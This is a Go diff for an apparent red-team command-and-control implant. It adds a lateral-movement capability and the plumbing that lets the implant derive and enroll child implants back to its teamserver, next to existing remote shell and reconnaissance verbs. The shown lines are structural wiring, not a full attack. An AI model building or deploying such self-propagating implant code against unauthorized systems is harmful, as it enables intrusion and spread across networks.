@@ -25,13 +25,23 @@ import (
 
 // Caps are the capability verbs the reference implant advertises at handshake
 // (architecture.md Sec 10). The teamserver gates dispatch on these: the core
-// shell verb plus the three recon verbs the runner implements.
+// shell verb, the three recon verbs the runner implements, and lateral.move so
+// a dispatched lateral task reaches the child-derivation handler.
 var Caps = []string{
 	"shell.exec",
 	"recon.portscan",
 	"recon.hostenum",
 	"recon.service",
+	"lateral.move",
 }
+
+// EnrollBundle carries the inputs the lateral.move handler needs to derive a
+// child implant that enrolls back against the same teamserver (architecture.md
+// Sec 10.1). The parent's own stager token is already spent at this implant's
+// enroll, so the child token arrives in the lateral.move arguments the operator
+// issues; the bundle here is the enroll endpoint, CA pin, transport profile,
+// and the parent's own implant id (named as the child's parent).
+type EnrollBundle = exec.EnrollBundle
 
 // Beacon runs the implant's check-in lifecycle against the teamserver: dial the
 // mTLS endpoint, complete the handshake, then loop dispatching downstream tasks
@@ -53,8 +63,10 @@ type Beacon struct {
 // New builds a Beacon from an enrollment result and the beacon profile. killDate
 // is the hard self-termination timestamp baked into the profile
 // (architecture.md Sec 7); the zero value disables the mid-run check (the
-// implant still refuses to start past it, enforced in main).
-func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certificate, sleep, jitter time.Duration, killDate time.Time, log *log.Logger) *Beacon {
+// implant still refuses to start past it, enforced in main). enroll carries the
+// inputs the lateral.move handler needs to derive a child; a zero-value bundle
+// (empty URL) leaves derivation disabled and the runner behaves as before.
+func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certificate, sleep, jitter time.Duration, killDate time.Time, enroll EnrollBundle, log *log.Logger) *Beacon {
 	return &Beacon{
 		beaconURL: beaconURL,
 		leaf:      leaf,
@@ -63,7 +75,7 @@ func New(beaconURL, implantID string, leaf tls.Certificate, cas []*x509.Certific
 		sleep:     sleep,
 		jitter:    jitter,
 		killDate:  killDate,
-		runner:    exec.NewRunner(log),
+		runner:    exec.NewRunnerWithEnroll(enroll, log),
 		log:       log,
 	}
 }
